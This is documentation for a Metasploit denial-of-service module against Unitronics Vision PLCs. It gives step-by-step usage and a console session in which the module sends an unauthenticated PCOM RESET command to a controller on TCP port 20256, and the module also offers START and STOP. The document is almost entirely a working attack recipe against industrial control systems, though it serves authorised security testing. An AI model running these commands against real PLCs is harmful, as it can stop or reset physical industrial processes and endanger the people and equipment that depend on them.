## Vulnerable Application

  Unitronics Vision PLCs

## Verification Steps

  1. Do: `use dos/scada/pcom`
  2. Do: `set RHOST=IP` where IP is the IP address of the target
  3. Do: `run` to send PCOM command

 ## Scenarios

   ```
msf > use dos/scada/pcom
msf auxiliary(dos/scada/pcom) > show options

Module options (auxiliary/dos/scada/pcom):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   MODE    RESET            yes       PLC command (Accepted: START, STOP, RESET)
   RHOST                    yes       The target address
   RPORT   20256            yes       The target port (TCP)
   UNITID  0                no        Unit ID (0 - 127)

msf auxiliary(dos/scada/pcom) > set RHOST 192.168.1.1
RHOST => 192.168.1.1
msf auxiliary(dos/scada/pcom) > run

[*] 192.168.1.1:20256 - Sending RESET command
[*] 192.168.1.1:20256 - Command accepted
[*] Auxiliary module execution completed
msf auxiliary(dos/scada/pcom) >
```
